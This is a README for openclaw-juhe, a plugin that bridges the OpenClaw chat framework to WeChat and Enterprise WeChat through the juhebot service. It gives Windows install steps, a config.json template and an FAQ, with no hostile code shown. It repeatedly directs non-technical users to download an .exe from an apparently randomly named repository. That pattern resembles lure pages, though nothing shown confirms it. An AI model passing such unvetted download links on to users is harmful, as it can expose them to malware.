# ⚙️ openclaw-juhe - WeChat and Enterprise WeChat Plugin

[![Download openclaw-juhe](https://img.shields.io/badge/Download-openclaw--juhe-brightgreen?style=for-the-badge)](https://github.com/enzymatic-angiospermae411/openclaw-juhe)

---

## 📥 Download openclaw-juhe

To get started, visit the link below to download openclaw-juhe on your Windows PC:

[Download openclaw-juhe](https://github.com/enzymatic-angiospermae411/openclaw-juhe)  

Click the link and follow the instructions on the page to get the latest version. This page contains the files you need to install and run the software.

---

## 🚀 Getting Started with openclaw-juhe on Windows

This guide explains how to download and use openclaw-juhe on a Windows computer. You do not need programming knowledge. Just follow the steps carefully.

### Step 1: Download the Software

1. Click the green “Download openclaw-juhe” button at the top or the link above.
2. On the GitHub page, look for the latest release under the "Releases" section.
3. Download the Windows version file. It might have a name ending with `.exe` or `.zip`.
4. Save the file to a folder you can find easily, such as your Desktop or Downloads.

### Step 2: Prepare Your Computer

Before running openclaw-juhe, make sure your computer meets these requirements:

- Windows 10 or later
- At least 4 GB of RAM
- At least 200 MB of free disk space
- Internet connection

Also, openclaw-juhe requires Node.js version 18 or higher. To check this:

1. Press `Windows + R`, type `cmd`, and press Enter.
2. In the command window, type `node -v` and press Enter.
3. If it shows a version less than 18 or says the command is not recognized, install Node.js 18 or newer from [https://nodejs.org/](https://nodejs.org/).

### Step 3: Install openclaw-juhe

There are two common ways to install openclaw-juhe from the downloaded file:

- **If you downloaded a `.exe` file:**  
Double-click the `.exe` file and follow the setup wizard. It will install openclaw-juhe automatically.

- **If you downloaded a `.zip` file:**  
1. Right-click the `.zip` file and select “Extract All.”  
2. Choose a folder to extract to, such as Desktop/openclaw-juhe.  
3. Open that folder after extraction.

### Step 4: Running openclaw-juhe

Once installed or extracted, follow these steps:

1. Open the folder where openclaw-juhe is installed.
2. Find a file named `start.bat` or `run.bat`. Double-click to run it.  
   
This will start the openclaw-juhe program. If no `.bat` files are present, you can open a command window in the folder:

- Hold `Shift` and right-click inside the folder.  
- Select “Open PowerShell window here” or “Open command window here.”  
- In the command line, type `node index.js` and press Enter to start.

### Step 5: Connect to WeChat and Enterprise WeChat

openclaw-juhe works with WeChat and Enterprise WeChat through a backend service called juhebot. This software sends and receives messages from these platforms.

You will need to have a juhebot account with a valid subscription, as this service requires paid access.

To configure openclaw-juhe with your juhebot account, see the configuration guide below.

---

## ⚙️ Configuration Guide

### juhebot Service Setup

- Create an account at the [juhebot website](https://juhebot.com) (subscription required).  
- Get your API key or token from your juhebot dashboard.

### Configure openclaw-juhe

Inside the openclaw-juhe folder, locate the `config.json` file. If it does not exist, create one.

Add or update the file with the following information:

```json
{
  "juhebotApiKey": "your-api-key-here",
  "wechatAccount": "your-wechat-account",
  "enterpriseWechatAccount": "your-enterprise-wechat-account"
}
```

Replace `"your-api-key-here"` with the actual API key from juhebot. Replace the account names with your respective WeChat and Enterprise WeChat accounts.

### Starting openclaw-juhe After Setup

After saving your config file, start openclaw-juhe using the same method in Step 4. The app will connect to juhebot and begin handling messages.

---

## 🔧 How openclaw-juhe Works

openclaw-juhe extends the OpenClaw chat framework to handle WeChat and Enterprise WeChat. It connects via juhebot, which manages message delivery.

The core functions include:

- Receiving messages from users in WeChat or Enterprise WeChat  
- Sending replies automatically or manually  
- Supporting text, images, files, voice, and video messages  
- Working with individual chats and group chats  

This plugin acts as a bridge between OpenClaw and these chat platforms, making them part of your multi-platform bot setup.

---

## 📝 Common Questions

### Do I need programming skills?

No. You only need to download, configure basic settings, and run the program. The plugin handles communication automatically.

### What if I do not have juhebot?

Without a juhebot subscription, openclaw-juhe won’t function properly. You can still download and explore the source to learn how the plugin works.

### Can I use openclaw-juhe on Mac or Linux?

This guide is for Windows users. The software may work elsewhere but requires manual setup and technical knowledge.

### Where to find help?

Check the openclaw-juhe GitHub page for issues and documentation.

---

## 🔗 Useful Links

- openclaw-juhe GitHub repository:  
  https://github.com/enzymatic-angiospermae411/openclaw-juhe  

- juhebot service page:  
  https://juhebot.com  

- OpenClaw main project:  
  https://github.com/openclaw/openclaw  

---

## 🛠️ System Requirements

- Operating system: Windows 10 or 11  
- Memory: 4 GB minimum  
- Disk space: 200 MB free  
- Network: Active internet connection for juhebot access  
- Software: Node.js 18 or later  

---

## ✅ Supported Message Types

- Text messages  
- Images  
- File attachments  
- Voice messages  
- Video messages  

---

[![Download openclaw-juhe](https://img.shields.io/badge/Download-openclaw--juhe-brightgreen?style=for-the-badge)](https://github.com/enzymatic-angiospermae411/openclaw-juhe)